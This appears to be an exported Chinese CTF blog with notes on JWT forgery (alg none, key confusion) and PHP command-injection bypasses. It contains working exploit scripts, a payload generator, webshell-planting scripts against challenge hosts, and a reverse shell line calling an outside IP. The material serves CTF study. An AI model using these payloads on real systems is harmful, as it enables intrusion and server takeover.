安全问题敏感信息泄露因为payload和header只经过Base64Url编码，如果开发者把一些敏感信息存放到里面，我们可以轻松获得
未校验签名某些服务端并未校验JWT签名，所以，可以尝试修改signature后(或者直接删除signature)看其是否还有效。
签名算法置空(CVE-2015-2951)我们知道，签名算法可以确保JWT在传输过程中不会被恶意用户所篡改
但头部中的alg字段却可以改为none，服务端接收到后会将其认定为无加密算法， 于是对signature的检验也就失效了，那么我们就可以随意修改payload部分伪造token
因为jwt.io将alg为none视为恶意行为，所以无法通过在线工具生成JWT，可以用python的jwt库来实现
import jwttoken_dict = &#123;  &quot;iss&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1674031091,  &quot;exp&quot;: 1674038291,  &quot;nbf&quot;: 1674031091,  &quot;sub&quot;: &quot;admin&quot;,  &quot;jti&quot;: &quot;e41ff441b04bf337ab3ca715f64a76e1&quot;&#125;headers = &#123;  &quot;alg&quot;: &quot;none&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;jwt_token = jwt.encode(token_dict,                       &quot;&quot;,  				 # 进行加密签名的密钥                       algorithm=&quot;none&quot;,  	 # 指明签名算法方式, 默认也是HS256                       headers=headers                       )print(jwt_token)

运行结果eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.
签名密钥爆破JWT使用算法对header和payload进行加密，如果我们可以爆破出加密密钥，那么也就可以随意修改token了
Github-jwt爆破脚本

非对称密码算法&#x3D;&gt;对称密码算法(CVE-2016-10555)JWT的签名加密算法有两种，对称加密算法和非对称加密算法
对称加密算法比如HS256使用密钥为所有消息进行签名和验证非对称加密算法比如RS256使用私钥对消息进行签名并使用公钥进行身份验证
如果我们获取到了公钥，可以将头部中的算法修改从RS256更改为HS256，这样后端代码就会使用RSA公钥+HS256算法进行签名验证
js代码实现例子
const jwt = require(&#x27;jsonwebtoken&#x27;);var fs = require(&#x27;fs&#x27;);var privateKey = fs.readFileSync(&#x27;public.key&#x27;);var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, privateKey, &#123; algorithm: &#x27;HS256&#x27; &#125;);console.log(token)


python代码实现例子
不过用python跑的时候因为jwt版本过高会报错The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret解决方法：pip install pyjwt==0.4.3
import jwtpublic = open(&#x27;public.pem&#x27;, &#x27;r&#x27;).read()print(jwt.encode(&#123;&quot;data&quot;:&quot;test&quot;&#125;, key=public, algorithm=&#x27;HS256&#x27;))

私钥泄露因为非对称加密算法利用私钥生成jwt，利用公钥解密jwt，所以我们只要有私钥然后自己就可以重新生成
const jwt = require(&#x27;jsonwebtoken&#x27;);var fs = require(&#x27;fs&#x27;);var privateKey = fs.readFileSync(&#x27;private.key&#x27;);var token = jwt.sign(&#123; user: &#x27;admin&#x27; &#125;, privateKey, &#123; algorithm: &#x27;RS256&#x27; &#125;);console.log(token)

如果运行报错Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256可以强行注释node_modules\jsonwebtoken\sign.js中对于密钥长度的判断

其他听说还有通过KID实现任意文件读取，注入等操作，CVE-2018-0114，CVE-2022-39227，下次抽空研究下
工具jwtiojwt_toolc-jwt-cracker
参考文章：JSON Web Token (JWT) 攻击技巧JWT原理及常见攻击方式JWT总结CVE-2022-39227漏洞分析
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>RCE总结-命令执行</title>
    <url>/posts/729e10b0/</url>
    <content><![CDATA[部分题目环境&amp;脚本&amp;姿势来自https://ctf.show/
命令执行函数主要有6种函数可以执行系统命令，分别是system,passthru,exec,shell_exec,popen,pcntl_exec
参数值可控$a=$_POST[&#x27;a&#x27;];system(&quot;ls &quot;.$a);

直接用;将命令分割成两部分执行
或者用&amp;&amp;和||&amp;&amp;表示前一条命令执行成功时，才执行后一条命令||表示上一条命令执行失败后，才执行下一条命令
命令可控$a=$_POST[&#x27;a&#x27;];system($a.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);

与上题类似
其他方式跳出控制范围cd /%0apwd 相当于依次执行命令cd /和pwd
整体可控黑名单过滤比赛中较为常见的一种类型，将关键词替换成空或其他字符如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量
常见的读取文件的命令：cat,tac,od,nl,less,more,sed p,head,tail,sort,uniq,file -f,date -f常见的列目录的命令：ls,du常用的还有通配符*和?
黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字
比如
cat /flag–&gt;ca&#39;&#39;t /flag–&gt;ca&quot;&quot;t /flag–&gt;ca\t /flag–&gt;ca$1t /flag–&gt;ca$IFS$1t /flag
或者正则，[^a]代表不是a的其他字符
more [^a][^a][^m][^b]
符号过滤符号过滤也非常常见
比如可以用&lt;&gt;,$&#123;IFS&#125;,$IFS$9,%09,%0b,%0c等代替空格
再者，可以利用变量来截取
比如通过env命令获取到了如下变量
PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgiUSER=www-dataHOSTNAME=f3f5c6c3e3eePHP_INI_DIR=/usr/local/etc/phpSHLVL=2HOME=/home/www-dataPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_MD5=PHP_VERSION=7.3.22GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5DPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xzPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHPIZE_DEPS=autoconf 		dpkg-dev dpkg 		file 		g++ 		gcc 		libc-dev 		make 		pkgconf 		re2cPWD=/var/www/htmlPHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5FLAG=not_flag

可以通过$&#123;PHPIZE_DEPS:9:1&#125;或者$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;表示空格
无字母数字命令执行if(!preg_match(&quot;/[a-z]|[0-9]/i&quot;,$cmd))&#123;    system($cmd);&#125;

构造一个文件上传网页，强制上传，利用?匹配文件来rce
&lt;form action=&quot;http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;

抓包爆破，用[@-[]来匹配大写字母，可以增加读到的概率
POST /?cmd=.%20/???/????????[@-[] HTTP/1.1Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080Content-Length: 421Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://192.168.1.17Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://192.168.1.17/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close------WebKitFormBoundaryIoD8zFE5URcUFT3bContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;Content-Type: text/htmlwhoami------WebKitFormBoundaryIoD8zFE5URcUFT3b--


$数字命令执行(bash)shell脚本中$的多种用法



变量名
含义



$0
脚本本身的名字


$1
脚本后所输入的第一串字符


$2
传递给该shell脚本的第二个参数


$*
脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’


$@
脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’


$_
表示上一个命令的最后一个参数


$#
#脚本后所输入的字符串个数


$$
脚本运行的当前进程ID号


$!
表示最后执行的后台命令的PID


$?
显示最后命令的退出状态，0表示没有错误，其他表示由错误



linux中可以通过$’xxx’（xxx为字符的八进制）的形式来执行命令

例如
$&#x27;\154\163&#x27;   # ls$&#x27;\167\150\157\141\155\151&#x27;   # whoami

但是不能携带参数，需要通过其他方式来传参
$&#x27;\154\163&#x27; $&#x27;\57&#x27;   #  ls /$&#x27;\143\141\164&#x27;&lt;$&#x27;\57\146\154\141\147&#x27;  #  cat&lt;/flag


一个允许使用的符号的例子
$white_list = [&#x27;!&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;&lt;&#x27;, &#x27;\\&#x27;, &#x27;_&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;]

在bash中对于整数的表示形式是[base#]n，比如2#100就是4
在只有0和1的情况下，只要构造出2，就可以构造出任意数字了
$((1&lt;&lt;1))# 这里通过位运算构造，相当于 00000001 位移后变成 000000010

可以得到以下转换过程
ls$&#x27;\154\163&#x27;$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;    # 但是bash解析后变成 $&#x27;\154\163&#x27;  不会进一步解析bash&lt;&lt;&lt;$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;   # 只需要将字符串用&lt;&lt;&lt;语法传递给bash即可，但是不支持带参数的命令bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;   # 通过两次&lt;&lt;&lt;传递复杂参数$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;       # 使用$0代替bash

使用脚本自动转换命令
cmd = &#x27;cat /flag&#x27;payload = &#x27;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;for c in cmd:    payload += f&#x27;\\\\$(($((1&lt;&lt;1))#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;payload += &#x27;\\\&#x27;&#x27;print(payload)

替换数字1如果不能使用1了，可以使用上面表格中的$#来表示，两个##就是1，一个就是0
脚本如下
cmd = &#x27;cat /flag&#x27;payload = &#x27;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;for c in cmd:    payload += f&#x27;\\\\$(($((1&lt;&lt;1))#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;, &#x27;$&#123;##&#125;&#x27;)payload += &#x27;\\\&#x27;&#x27;print(payload)


替换符号##在上一步中是用来替换1的，如果不能用了，还能通过~符号来拿到数字
在linux中，$(())可以拿到0，通过~按位取反，就可以拿到-1。很多个-1进行叠加运算，可以得到-2，-3，-4，-5，-6，-7，-8等等，在将这些数字按位取反，就能拿到8进制中的所有数字
&#x27;$(())&#x27;  # 0&#x27;$((~$(($((~$(())))$((~$(())))))))&#x27;  # 1&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#x27;  # 2&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;  # 3&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;  # 4&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;  # 5&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;  # 6&#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;  # 7


替换bash在之前的payload中用的是$0来代替bash，如果不能使用0就需要构造另一个变量，变量值是0
linux中可以通过$&#123;!?&#125;和$&#123;!#&#125;的形式拿到bash，但是在php的system环境下没有实现
不过可以定义一个__=$(())的方式将__变量的值设置为0，然后通过$&#123;!__&#125;的形式拿到sh字符
__=$(())&amp;&amp;echo $&#123;!__&#125;   # bash

而以下变量的值同样是0
__=$&#123;?&#125;&amp;&amp;echo $&#123;!__&#125;   # bash__=$&#123;#&#125;&amp;&amp;echo $&#123;!__&#125;   # bash


综合利用脚本以下是我改编自bashFuck的脚本Non-alphanumeric-rce-for-bash
from string import printabledef info(s):    total = 0    used_chars = set()    for c in s:        if c.isprintable() and c not in used_chars:            total += 1            used_chars.add(c)    return &quot;Charset : &quot; + &#x27; &#x27;.join(sorted(used_chars)) + &#x27;\n&#x27; + f&quot;Total Used: &#123;total&#125;&quot; + &#x27;\n&#x27; + &quot;Total length = &quot; + str(        len(s)) + &#x27;\n&#x27; + &quot;Payload = &quot; + s + &#x27;\n&#x27; + &quot;---------------------------&quot;def GeneratePayload(char, cmd):    list_1 = [&#x27;$&#x27;, &#x27;\\&#x27;, &#x27;\&#x27;&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27; &#x27;]    list_2 = [&#x27;#&#x27;, &#x27;$&#x27;, &#x27;\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;&lt;&#x27;, &#x27;\\&#x27;]    list_3 = [&#x27;#&#x27;, &#x27;$&#x27;, &#x27;\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;0&#x27;, &#x27;&lt;&#x27;, &#x27;\\&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;]    list_4 = [&#x27;!&#x27;, &#x27;$&#x27;, &#x27;&amp;&#x27;, &#x27;\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;\\&#x27;, &#x27;_&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;]    list_5 = [&#x27;!&#x27;, &#x27;_&#x27;, &#x27;?&#x27;, &#x27;+&#x27;, &#x27;$&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;=&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;&lt;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;]    list_6 = [&#x27;!&#x27;, &#x27;_&#x27;, &#x27;+&#x27;, &#x27;$&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;=&#x27;, &#x27;#&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;&lt;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;]    if &quot;&#x27;&quot; not in char or &quot;\\&quot; not in char:        print(f&quot;必要字符不在列表中，无法生成payload&quot;)        return    elif all(c in char for c in list_1):        print(payload_base(cmd))    elif all(c in char for c in list_2):        print(payload_2(cmd, &#x27;num&#x27;))    elif all(c in char for c in list_3):        print(payload_2(cmd, &#x27;not_one&#x27;))    elif all(c in char for c in list_4):        print(payload_3(cmd))    elif all(c in char for c in list_5):        print(payload_4(cmd, &#x27;all&#x27;))    elif all(c in char for c in list_6):        print(payload_4(cmd, &#x27;not_question_mark&#x27;))    else:        print(&quot;可用符号不足，以下是全部payload&quot;)        print(&quot;---------------------------&quot;)        # 输出全部payload        print(payload_base(cmd))        print(payload_2(cmd, &#x27;num&#x27;))        print(payload_2(cmd, &#x27;not_one&#x27;))        print(payload_3(cmd))        print(payload_4(cmd, &#x27;all&#x27;))        print(payload_4(cmd, &#x27;not_question_mark&#x27;))def payload_base(cmd):    payload = &#x27;$\&#x27;&#x27;    for c in cmd:        if c == &#x27; &#x27;:            payload += &#x27;\&#x27; $\&#x27;&#x27;        else:            payload += &#x27;\\&#x27; + (oct(ord(c)))[2:]    payload += &#x27;\&#x27;&#x27;    return info(payload)def payload_2(cmd, form):    payload = &#x27;&#x27;    for c in cmd:        payload += f&#x27;\\\\$(($((1&lt;&lt;1))#&#123;bin(int((oct(ord(c)))[2:]))[2:]&#125;))&#x27;    payload_num = payload    payload_not_one = payload.replace(&#x27;1&#x27;, &#x27;$&#123;##&#125;&#x27;)  # 用 $&#123;##&#125; 来替换 1    if form == &#x27;num&#x27;:        payload_num = &#x27;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27; + payload_num + &#x27;\\\&#x27;&#x27;        return info(payload_num)    elif form == &#x27;not_one&#x27;:        payload_not_one = &#x27;$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27; + payload_not_one + &#x27;\\\&#x27;&#x27;        return info(payload_not_one)def payload_3(cmd):    # 构造0-7的payload    r = &#123;&#125;    x = &#x27;$((~$(())))&#x27;  # -1    r[0] = &#x27;$(())&#x27;  # 0    for i in range(1, 9):        r[i] = &#x27;$((~$((&#x27; + x        for j in range(i):            r[i] += x        r[i] += &#x27;))))&#x27;    payload = &#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;    for c in cmd:        payload += &#x27;\\\\&#x27;        for i in oct(ord(c))[2:]:            payload += r[int(i)]    payload += &#x27;\\\&#x27;&#x27;    return info(payload)def payload_4(cmd, form):    if form == &#x27;all&#x27;:        payload = &#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;    elif form == &#x27;not_question_mark&#x27;:        payload = &#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;    for c in cmd:        payload += f&#x27;\\\\$((2#&#123;bin(int(oct(ord(c))[2:]))[2:]&#125;))&#x27;.replace(&#x27;1&#x27;, &#x27;$&#123;__&#125;&#x27;).replace(&#x27;2&#x27;, &#x27;$&#123;____&#125;&#x27;).replace(            &#x27;0&#x27;, &#x27;$&#123;_____&#125;&#x27;)    payload += &#x27;\\\&#x27;&#x27;    return info(payload)def main():    try:        char = input(&quot;请输入列表格式的可用字符，回车默认全部: &quot;) or list(printable);        if type(char) == str:            char = eval(char)        while True:            cmd = input(&quot;输入想执行的命令: &quot;)            print(&quot;---------------------------&quot;)            GeneratePayload(char, cmd)    except:        print(&quot;格式错误，请检查后重试&quot;)        returnif __name__ == &quot;__main__&quot;:    # import requests    #    # url = &quot;https://644e2b3a-87e4-45d0-bf87-ba9662bbcbbd.challenge.ctf.show/&quot;    # white_list = []    # for i in range(1, 200):    #     data = &#123;    #         &quot;ctf_show&quot;: chr(i)    #     &#125;    #     send = requests.post(url=url, data=data)    #     if &quot;??&quot; in send.text:    #         print(f&quot;&#123;chr(i)&#125;&quot;)    #     else:    #         white_list.append(chr(i))    #    # print(&quot;white_list = &quot; + str(white_list))    main()

输入一个可用字符串列表即可生成可用的payload
请输入列表格式的可用字符，回车默认全部: [&#x27;$&#x27;, &#x27;\\&#x27;, &#x27;\&#x27;&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27; &#x27;]输入想执行的命令: ls /---------------------------Charset :   $ &#x27; 1 3 4 5 6 7 \Total Used: 10Total length = 18Payload = $&#x27;\154\163&#x27; $&#x27;\57&#x27;---------------------------输入想执行的命令: cat /flag---------------------------Charset :   $ &#x27; 1 3 4 5 6 7 \Total Used: 10Total length = 38Payload = $&#x27;\143\141\164&#x27; $&#x27;\57\146\154\141\147&#x27;---------------------------输入想执行的命令: 



长度限制7字符长度的命令执行web目录可写可写的情况主要利用&gt;写入shell到文件名中，然后利用ls -t命令排序，写入文件后用.执行。具体思路如下
在linux中，可以利用&gt;aa创建一个文件，文件名就是aa

执行一次ls -t&gt;0，然后cat 0，会发现文件中按照创建文件的先后顺序进行了排序，那么如果将里面的内容替换成恶意的一句话木马，然后执行，不就能rce了吗

为了避免符号的原因导致写入失败，先把一句话木马转成base64形式&lt;?php eval($_GET[1]);
PD9waHAgZXZhbCgkX0dFVFsxXSk7
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php
然后对要执行的命令进行分割，不超过7个一组，注意每组后面加个\，在linux中表示一行未输入完
最后0文件中应该是如下内容

执行. 0，就会生成一个1.php
整合脚本
# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:01# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/&quot;payload=[&quot;&gt;hp&quot;,&quot;&gt;1.p\\&quot;,&quot;&gt;d\\&gt;\\&quot;,&quot;&gt;\\ -\\&quot;,&quot;&gt;e64\\&quot;,&quot;&gt;bas\\&quot;,&quot;&gt;7\\|\\&quot;,&quot;&gt;XSk\\&quot;,&quot;&gt;Fsx\\&quot;,&quot;&gt;dFV\\&quot;,&quot;&gt;kX0\\&quot;,&quot;&gt;bCg\\&quot;,&quot;&gt;XZh\\&quot;,&quot;&gt;AgZ\\&quot;,&quot;&gt;waH\\&quot;,&quot;&gt;PD9\\&quot;,&quot;&gt;o\\ \\&quot;,&quot;&gt;ech\\&quot;,&quot;ls -t&gt;0&quot;,&quot;. 0&quot;]def writeFile(payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	requests.post(url,data=data)def run():	for p in payload:		writeFile(p.strip())		print(&quot;[*] create &quot;+p.strip())		time.sleep(1)def check():	response = requests.get(url+&quot;1.php&quot;)	if response.status_code == requests.codes.ok:		print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;.1.php&quot;)def main():	run()	check()if __name__ == &#x27;__main__&#x27;:	main()




web目录不可写既然当前目录不可写，那么可以利用可写的目录，比如php的临时文件存储目录/tmp/
这样我们可以利用php的文件存储机制强行上传一个文件，内容是反弹shell的语句，然后利用. /t*/*匹配我们上传的文件并执行，刚好7个字符

自动化脚本
# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:10# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/&quot;def getShell(payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	file = &#123;	&quot;file&quot;:b&quot;#!/bin/sh\nnc 43.154.107.226 3389 -e /bin/sh&quot;	&#125;	requests.post(url,data=data,files=file)    print(&quot;[*] Attack success!!!&quot;)def run():	getShell(&quot;. /t*/*&quot;)def main():	run()if __name__ == &#x27;__main__&#x27;:	main()


5字符长度的命令执行环境有dir主要思路：1：将index.php转为.php2：将临时文件打包到当前目录3：使用php执行tar压缩包
第一步的操作与7字符可写差不多，主要是为了index.php这个文件名不影响后面的排序
先复制一份index.php的内容

然后通过cp，rev，dir等命令将index.php转化为了php.xedni

先将多余的文件删除，再利用shell中的注释符#，成功得到.php文件

删去多余的文件，创建tar命令和vcf参数

强制上传一个文件到php的文件缓存目录/tmp/xxxx，内容是&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);?&gt;
然后最关键的命令来了，使用* /t*打包恶意文件到z，实际上执行的是tar vcf z /tmp/*
最后使用php z命令写入shell

自动化脚本
# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:17# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/&quot;url_2 = url+&quot;.php&quot;delay = 1chagneFile_payload=[&#x27;&gt;cp&#x27;,&#x27;&gt;k&#x27;,&#x27;*&#x27;,&#x27;rm cp&#x27;,&#x27;&gt;pc&#x27;,&#x27;&gt;dir&#x27;,&#x27;*&gt;v&#x27;,&#x27;&gt;rev&#x27;,&#x27;*v&gt;z&#x27;,&#x27;sh z&#x27;,&#x27;rm v&#x27;,&#x27;rm k&#x27;,&#x27;rm z&#x27;,&#x27;rm pc&#x27;,&#x27;rm *v&#x27;,&#x27;&gt;php.&#x27;,&#x27;&gt;j\\#&#x27;,&#x27;&gt;vm&#x27;,&#x27;*&gt;v&#x27;,&#x27;&gt;rev&#x27;,&#x27;*v&gt;z&#x27;,&#x27;sh z&#x27;]clearFile_payload=[&#x27;rm d*&#x27;,&#x27;rm j*&#x27;,&#x27;rm p*&#x27;,&#x27;rm r*&#x27;,&#x27;rm v*&#x27;,&#x27;rm z&#x27;]shell_payload=[&#x27;&gt;tar&#x27;,&#x27;&gt;vcf&#x27;,&#x27;&gt;z&#x27;]file=&#123;	&#x27;file&#x27;:b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;&#125;def changeFile():	for p in chagneFile_payload:		sendPayload(url,p)		print(&quot;[*] create &quot;+p.strip())		time.sleep(delay)def clearFile():	for p in clearFile_payload:		sendPayload(url_2,p)		print(&quot;[*] create &quot;+p.strip())		time.sleep(delay)def getshell():	for p in shell_payload:		sendPayload(url_2,p)		print(&quot;[*] create &quot;+p.strip())		time.sleep(delay)	data=&#123;		&quot;cmd&quot;:&quot;* /t*&quot;	&#125;	requests.post(url_2,data=data,files=file)	data=&#123;		&quot;cmd&quot;:&quot;php z&quot;	&#125;	requests.post(url_2,data=data)def checkShell():	response = requests.get(url+&quot;1.php&quot;)	if response.status_code == requests.codes.ok:		print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;)def sendPayload(url,payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	requests.post(url,data=data)def run():	changeFile()	clearFile()	getshell()	checkShell()def main():	run()if __name__ == &#x27;__main__&#x27;:	main()


环境无dirdir与ls最大的区别就是dir没有换行
这题主要思路是利用grep命令修改题目，可以说是非常巧妙了
具体步骤如下:
写入grep和h，接着*执行，实际上就是拿出题目中包含h的每一行，恰好if(strlen($cmd) &lt;= 5)是没有h的，这样就没有限制了

将修改后的代码追加到i中

cp到index.php中

整合脚本
# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-05-06 13:25:41# @Last Modified by:   h1xa# @Last Modified time: 2022-05-10 20:55:28# @email: h1xa@ctfer.com# @link: https://ctfer.comimport requestsimport timeurl = &quot;http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/&quot;payload=[&quot;&gt;grep&quot;,&quot;&gt;h&quot;,&quot;*&gt;j&quot;,&quot;rm g*&quot;,&quot;rm h*&quot;,&quot;&gt;cat&quot;,&quot;*&gt;&gt;i&quot;,&quot;rm c*&quot;,&quot;rm j&quot;,&quot;&gt;cp&quot;,&quot;*&quot;]def writeFile(payload):	data=&#123;	&quot;cmd&quot;:payload	&#125;	requests.post(url,data=data)def run():	for p in payload:		writeFile(p.strip())		print(&quot;[*] create &quot;+p.strip())		time.sleep(0.3)	print(&quot;[*] Attack success!!!Webshell is &quot;+url)def main():	run()if __name__ == &#x27;__main__&#x27;:	main()


4字符长度的命令执行环境有dir主要思路和7字符可写差不多，拼接出ls -t命令到某个文件中，在按倒序写入写马的语句，依次执行即可。主要是注意文件顺序问题
自动化脚本
